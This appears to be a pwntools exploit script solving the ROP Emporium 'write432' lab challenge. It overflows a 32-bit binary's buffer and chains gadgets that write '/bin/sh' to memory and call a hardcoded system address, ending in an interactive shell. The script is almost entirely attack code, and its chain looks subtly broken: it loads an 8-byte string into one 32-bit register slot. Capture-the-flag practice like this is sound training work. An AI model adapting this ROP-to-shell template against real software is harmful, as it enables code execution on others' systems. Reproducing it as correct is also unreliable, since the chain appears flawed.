#!/usr/bin/python3
from pwn import *
exe = context.binary = ELF('./write432')
p = process('./write432')
for i in range(4):
	print(p.recvline(timeout=1).decode('utf-8').strip('\n'))
# using gdb we found the offset to be 44
offset = 44
r = ROP(context.binary)
pop_args = p32(0x80485aa)
'''
pop edi #load registers with args from the stack
pop ebp
ret
'''
edi = p32(0x0804a000)
ebp = b'/bin/sh\x00'
'''
writable_addr = 0x0804a000
gadget to write:
0x08048543 <+0>:	mov    DWORD PTR [edi],ebp
0x08048545 <+2>:	ret
'''
# send the ROP chain
exploit = b'a'*offset + pop_args + edi + ebp
exploit += p32(0x8048543) + p32(0x080485aa)
# call system
exploit += edi + p32(0xf7e05660)
p.sendline(exploit)
print(p.recvline(timeout=1).decode('utf-8'))
p.interactive()
p.close()
